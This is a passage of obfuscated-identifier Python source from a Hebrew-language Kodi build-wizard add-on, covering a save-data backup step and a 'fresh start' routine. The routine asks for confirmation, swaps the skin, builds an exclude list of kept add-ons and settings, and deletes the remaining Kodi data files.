					O0O0O0OOO0OO00000 .write (os .path .join (O00O0O0O00O00OO0O ,OO0O0OOO00OOOOO0O ),os .path .join (O00O0O0O00O00OO0O ,OO0O0OOO00OOOOO0O ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4433
		O0O0O0OOO0OO00000 .close ()#line:4434
		if OOOOOO0OOO0OO0000 ==O00OO0OOO0OO0OO00 :#line:4435
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00000O00OOOO0O0 ))#line:4436
		else :#line:4437
			try :#line:4438
				xbmcvfs .copy (OO00000O00OOOO0O0 ,os .path .join (OOOOOO0OOO0OO0000 ,'SaveData.zip'))#line:4439
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OOOOOO0OOO0OO0000 ,'SaveData.zip')))#line:4440
			except :#line:4441
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00000O00OOOO0O0 ))#line:4442
def freshStart (install =None ,over =False ):#line:4447
	if USERNAME =='':#line:4448
		ADDON .openSettings ()#line:4449
		sys .exit ()#line:4450
	OOO0OO0O0O0OOOO00 =u_list (SPEEDFILE )#line:4451
	(OOO0OO0O0O0OOOO00 )#line:4452
	OOOO0O0O0O00OO00O =(wiz .workingURL (OOO0OO0O0O0OOOO00 ))#line:4453
	(OOOO0O0O0O00OO00O )#line:4454
	if KEEPTRAKT =='true':#line:4455
		traktit .autoUpdate ('all')#line:4456
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4457
	if KEEPREAL =='true':#line:4458
		debridit .autoUpdate ('all')#line:4459
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4460
	if KEEPLOGIN =='true':#line:4461
		loginit .autoUpdate ('all')#line:4462
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4463
	if over ==True :O00O0O00OO0O00O00 =1 #line:4464
	elif install =='restore':O00O0O00OO0O00O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4465
	elif install :O00O0O00OO0O00O00 =1 #line:4466
	else :O00O0O00OO0O00O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4467
	if O00O0O00OO0O00O00 :#line:4468
		if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4469
			OOOOOO0O000O00000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.myconfluence'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4470
			skinSwitch .swapSkins (OOOOOO0O000O00000 )#line:4473
			OOOO00000O0O0O00O =0 #line:4474
			xbmc .sleep (1000 )#line:4475
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOO00000O0O0O00O <150 :#line:4476
				OOOO00000O0O0O00O +=1 #line:4477
				xbmc .sleep (1000 )#line:4478
				wiz .ebi ('SendAction(Select)')#line:4479
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4480
				wiz .ebi ('SendClick(11)')#line:4481
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4482
			xbmc .sleep (1000 )#line:4483
		if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4484
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4485
			return #line:4486
		wiz .addonUpdates ('set')#line:4487
		OOO00O00OO0OOO0OO =os .path .abspath (HOME )#line:4488
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4489
		O0O0O00O0OO0OOO0O =sum ([len (O00O00000O000O00O )for OOO0O0OO0O0OOO0O0 ,OO000O0O00000OOOO ,O00O00000O000O00O in os .walk (OOO00O00OO0OOO0OO )]);O00O0000O0OOOO000 =0 #line:4490
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4491
		EXCLUDES .append ('My_Builds')#line:4492
		EXCLUDES .append ('archive_cache')#line:4493
		EXCLUDES .append ('script.module.requests')#line:4494
		EXCLUDES .append ('myfav.anon')#line:4495
		if KEEPREPOS =='true':#line:4496
			O0O0OO00OOOOOOO0O =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4497
			for O000000O0OO0OO0OO in O0O0OO00OOOOOOO0O :#line:4498
				O0OO0O0OOO00O00O0 =os .path .split (O000000O0OO0OO0OO [:-1 ])[1 ]#line:4499
				if not O0OO0O0OOO00O00O0 ==EXCLUDES :#line:4500
					EXCLUDES .append (O0OO0O0OOO00O00O0 )#line:4501
		if KEEPSUPER =='true':#line:4502
			EXCLUDES .append ('plugin.program.super.favourites')#line:4503
		if KEEPMOVIELIST =='true':#line:4504
			EXCLUDES .append ('plugin.video.metalliq')#line:4505
		if KEEPMOVIELIST =='true':#line:4506
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4507
		if KEEPADDONS =='true':#line:4508
			EXCLUDES .append ('addons')#line:4509
		if KEEPADDONS =='true':#line:4510
			EXCLUDES .append ('addon_data')#line:4511
		EXCLUDES .append ('plugin.video.elementum')#line:4514
		EXCLUDES .append ('script.elementum.burst')#line:4515
		EXCLUDES .append ('script.elementum.burst-master')#line:4516
		EXCLUDES .append ('plugin.video.quasar')#line:4517
		EXCLUDES .append ('script.quasar.burst')#line:4518
		EXCLUDES .append ('skin.estuary')#line:4519
		if KEEPWHITELIST =='true':#line:4522
			OOO00OOOOOOOOOOOO =''#line:4523
			OO0O000OO0OOO0OO0 =wiz .whiteList ('read')#line:4524
			if len (OO0O000OO0OOO0OO0 )>0 :#line:4525
				for O000000O0OO0OO0OO in OO0O000OO0OOO0OO0 :#line:4526
					try :O0OO000OO00O0000O ,O0OO00O0OO0O00OO0 ,OO0OOOOO00OOOOO0O =O000000O0OO0OO0OO #line:4527
					except :pass #line:4528
					if OO0OOOOO00OOOOO0O .startswith ('pvr'):OOO00OOOOOOOOOOOO =O0OO00O0OO0O00OO0 #line:4529
					O0O0000O000000000 =dependsList (OO0OOOOO00OOOOO0O )#line:4530
					for OOOOOOO0O00OO000O in O0O0000O000000000 :#line:4531
						if not OOOOOOO0O00OO000O in EXCLUDES :#line:4532
							EXCLUDES .append (OOOOOOO0O00OO000O )#line:4533
						O0OO000OOO0O00000 =dependsList (OOOOOOO0O00OO000O )#line:4534
						for OOO000OO00O000000 in O0OO000OOO0O00000 :#line:4535
							if not OOO000OO00O000000 in EXCLUDES :#line:4536
								EXCLUDES .append (OOO000OO00O000000 )#line:4537
					if not OO0OOOOO00OOOOO0O in EXCLUDES :#line:4538
						EXCLUDES .append (OO0OOOOO00OOOOO0O )#line:4539
				if not OOO00OOOOOOOOOOOO =='':wiz .setS ('pvrclient',OO0OOOOO00OOOOO0O )#line:4540
		if wiz .getS ('pvrclient')=='':#line:4541
			for O000000O0OO0OO0OO in EXCLUDES :#line:4542
				if O000000O0OO0OO0OO .startswith ('pvr'):#line:4543
					wiz .setS ('pvrclient',O000000O0OO0OO0OO )#line:4544
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4545
		OO000000OOOOO00O0 =wiz .latestDB ('Addons')#line:4546
		for O0OOO00000OOO000O ,OO0OOO00O0O0OO0O0 ,OO00OO0OO00O00OOO in os .walk (OOO00O00OO0OOO0OO ,topdown =True ):#line:4547
			OO0OOO00O0O0OO0O0 [:]=[OOO000000000O0OO0 for OOO000000000O0OO0 in OO0OOO00O0O0OO0O0 if OOO000000000O0OO0 not in EXCLUDES ]#line:4548
			for O0OO000OO00O0000O in OO00OO0OO00O00OOO :#line:4549
				O00O0000O0OOOO000 +=1 #line:4550
				OO0OOOOO00OOOOO0O =O0OOO00000OOO000O .replace ('/','\\').split ('\\')#line:4551
				OOOO00000O0O0O00O =len (OO0OOOOO00OOOOO0O )-1 #line:4553
				if OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4554
				elif O0OO000OO00O0000O =='MyVideos99.db'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4555
				elif O0OO000OO00O0000O =='MyVideos107.db'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4556
				elif O0OO000OO00O0000O =='MyVideos116.db'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4557
				elif O0OO000OO00O0000O =='MyVideos99.db'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4558
				elif O0OO000OO00O0000O =='MyVideos107.db'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4559
				elif O0OO000OO00O0000O =='MyVideos116.db'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4560
				elif OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4561
				elif OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'skin.anonymous.mod'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4562
				elif OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'skin.Premium.mod'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4563
				elif OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'skin.anonymous.nox'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4564
				elif OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'skin.phenomenal'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4565
				elif OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'plugin.video.metalliq'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4566
				elif OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'skin.titan'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4568
				elif OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'pvr.iptvsimple'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4569
				elif O0OO000OO00O0000O =='sources.xml'and OO0OOOOO00OOOOO0O [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4571
				elif O0OO000OO00O0000O =='quicknav.DATA.xml'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4574
				elif O0OO000OO00O0000O =='x1101.DATA.xml'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4575
				elif O0OO000OO00O0000O =='b-srtym-b.DATA.xml'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4576
				elif O0OO000OO00O0000O =='x1102.DATA.xml'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4577
				elif O0OO000OO00O0000O =='b-sdrvt-b.DATA.xml'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4578
				elif O0OO000OO00O0000O =='x1112.DATA.xml'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4579
				elif O0OO000OO00O0000O =='b-tlvvyzyh-b.DATA.xml'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4580
				elif O0OO000OO00O0000O =='x1111.DATA.xml'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4581
				elif O0OO000OO00O0000O =='b-tvknyshrly-b.DATA.xml'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4582
				elif O0OO000OO00O0000O =='x1110.DATA.xml'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4583
				elif O0OO000OO00O0000O =='b-yldym-b.DATA.xml'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4584
				elif O0OO000OO00O0000O =='x1114.DATA.xml'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4585
				elif O0OO000OO00O0000O =='b-mvzyqh-b.DATA.xml'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4586
				elif O0OO000OO00O0000O =='mainmenu.DATA.xml'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4587
				elif O0OO000OO00O0000O =='skin.Premium.mod.properties'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4588
				elif O0OO000OO00O0000O =='favourites.xml'and OO0OOOOO00OOOOO0O [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4592
				elif O0OO000OO00O0000O =='guisettings.xml'and OO0OOOOO00OOOOO0O [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4594
				elif O0OO000OO00O0000O =='profiles.xml'and OO0OOOOO00OOOOO0O [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4595
				elif O0OO000OO00O0000O =='advancedsettings.xml'and OO0OOOOO00OOOOO0O [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4596
				elif OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4597
				elif OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'program.apollo'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4598
				elif OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4599
				elif OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'plugin.video.elementum'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4602
				elif OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'service.subtitles.All_Subs'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4603
				elif OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4604
				elif OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'plugin.video.quasar'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4606
				elif OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'program.apollo'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4607
				elif OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4608
				elif OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -2 ]=='userdata'and OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OO0OOOOO00OOOOO0O [OOOO00000O0O0O00O ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4609
				elif O0OO000OO00O0000O in LOGFILES :wiz .log ("Keep Log File: %s"%O0OO000OO00O0000O ,xbmc .LOGNOTICE )#line:4610
				elif O0OO000OO00O0000O .endswith ('.db'):#line:4611
					try :#line:4612
						if O0OO000OO00O0000O ==OO000000OOOOO00O0 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O0OO000OO00O0000O ,KODIV ),xbmc .LOGNOTICE )#line:4613
						else :os .remove (os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ))#line:4614
					except Exception as OO0OO000O0O00O0O0 :#line:4615
						if not O0OO000OO00O0000O .startswith ('Textures13'):#line:4616
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4617
							wiz .log ("-> %s"%(str (OO0OO000O0O00O0O0 )),xbmc .LOGNOTICE )#line:4618
							wiz .purgeDb (os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ))#line:4619
				else :#line:4620
